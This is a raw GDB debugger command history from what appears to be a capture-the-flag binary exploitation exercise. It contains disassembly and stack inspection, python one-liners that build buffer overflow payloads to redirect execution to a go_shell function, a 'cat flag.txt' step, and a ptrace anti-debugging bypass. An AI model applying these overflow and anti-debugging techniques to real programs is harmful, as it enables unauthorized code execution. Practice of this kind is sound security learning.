code
x/22i main
run < payload
run
exit()
exit
quit
x/22i main
exit
quit
x/22i main
quit
break main
run
x/22i main
run < payload
quit
run < payload
run < payload
break main
x/22i main
quit
run < payload
run < payload
x/22i main
run < payload
run < payload
quit
x/22i main
x/22i main
x/10i main
x/22i main
quit
x/20i main
quit
x/20i main
run < payload
quit
x/20i main
run
run < payload
x/22i main
quit
x/22i main
x/20i main
run < payload
x/20i main
quit
x/20i main
run < payload
x/20i main
x/s 0x55555555601b
quit
x/20i main
run < payload
x/20i main
x/s 0x55555555601b
quit
break main
print system
run
print system
x/20i
disas main
run
disass main
run < exploit
run < exploit
exit
quit
x/20i main
run
x/20i main
run
x/x 0x7fffffffe160+0x20
x/x 0x7fffffffe160+28
x/x 0x7fffffffe160+0x28
x/x 0x7fffffffe160+0x20-0x4
x/x 0x7fffffffe17c
x/s 0x7fffffffe17c
x/s 0x7fffffffe60
x/s 0x7fffffffe160
run < abc
run < exploit
x/s 0x7fffffffe160
x/8xs 0x7fffffffe160
x/8s 0x7fffffffe160
x/32s 0x7fffffffe17c
x/32s 0x7fffffffe160
x/32s 0x7fffffffe17c
x/28s 0x7fffffffe17c+0x20
x/64s 0x7fffffffe17c+0x20
x/64x 0x7fffffffe160+0x28
x/64x 0x7fffffffe160
run < exploit
x/64x 0x7fffffffe160
x/64x 0x7fffffffe150
x/64x 0x7fffffffe120
x/64x 0x7fffffffe100
x/64x 0x7fffffffe160
disass main
run < exploit
x/10x 0x7fffffffe160
run < exploit
x/10x 0x7fffffffe160
run
x/10x 0x7fffffffe160
quit
run
x/10x 0x7fffffffe160
run
x/10x 0x7fffffffe160
run < exploit
x/10x 0x7fffffffe160
x/20i main
x/20x 0x7fffffffe160
x/20x 0x7fffffffe120
run < exploit
x/20x 0x7fffffffe120
x/20x 0x7fffffffe160
run < exploit
x/20x 0x7fffffffe160
x/20x 0x7fffffffe160
x/20i main
x/20x 0x7fffffffe160
x/64x 0x7fffffffe160
x/20x 0x7fffffffe160
x/s 0x7fffffffe160
x/10s 0x7fffffffe160
x/40s 0x7fffffffe160
x/20x 0x7fffffffe160
quit
break main
run
x/20i main
break main
run
print system
run < exploit
c
quit
x/20i main
run
x/20i main
run
run < exploit
run < exploit
quit
run < exploit
run < exploit
quit
run < exploit
run
run < exploit
run
run < exploit
run
run < exploit
run
info function
r
info func
info func | grep go_shell
quit
r
disass main
disass go_shell
r < echo $(python -c "print 'A'*68 + '\x85\x51\x55\x55\x55\x55\x00\x00'")
r < echo $(python -c "print 'A'*72 + '\x85\x51\x55\x55\x55\x55\x00\x00'")
r < echo $(python -c "print 'A'*76 + '\x85\x51\x55\x55\x55\x55\x00\x00'")
r < echo $(python -c "print 'A'*64 + '\x85\x51\x55\x55\x55\x55\x00\x00'")
r < echo $(python -c "print 'A'*60 + '\x85\x51\x55\x55\x55\x55\x00\x00'")
r < echo $(python -c "print 'A'*76 + '\x85\x51\x55\x55\x55\x55\x00\x00'")
quit
r < (python -c "print 'A'*72 + '\x85\x51\x55\x55\x55\x55\x00\x00'"; cat)
r < (python -c "print 'A'*72 + '\x85\x51\x55\x55\x55\x55\x00\x00'")
r < echo $(python -c "print 'A'*72 + '\x85\x51\x55\x55\x55\x55\x00\x00'")
quit
ls
r < exploit
r < exploit
run < exploit
quit
r < exploit
cat flag.txt
r < exploit
quit
disass main
r
disass main
break 0x000055555555526f
break *0x000055555555526f
r < abc
r
run
quit
break *0x000055555555526f
disass main
r
disass main
p $rsp
x/16wx $rsp
x/16wx $rsp-0x1
x/16wx $rsp-0x10
x/64wx $rsp-0x20
quit
r < exploit
quit
r < exploit
quit
r < exploit
quit
r < exploit
unset env
r < exploit
quit
r < exploit
unset env
r < exploit
disass main
break *0x000055555555526f
r < exploit
x/64wx $rsp
x/64wx $rsp-0x30
x/64wx $rsp-0x50
x/64wx $rsp-0x70
x/64wx $rsp-0x60
x/64wx $rsp-0x50
0x18 * 4
1 * 4
18*4
python -c "18*4"
python -c "print 18*4"
quit
r < exploit
unset env
r < exploit
quit
disass main
b main
r
catch syscall ptrace
commands
c
1
commands 1
commands 1
set ($eax) = 0
continue
en
end
b main
r
disass main
exit
quit
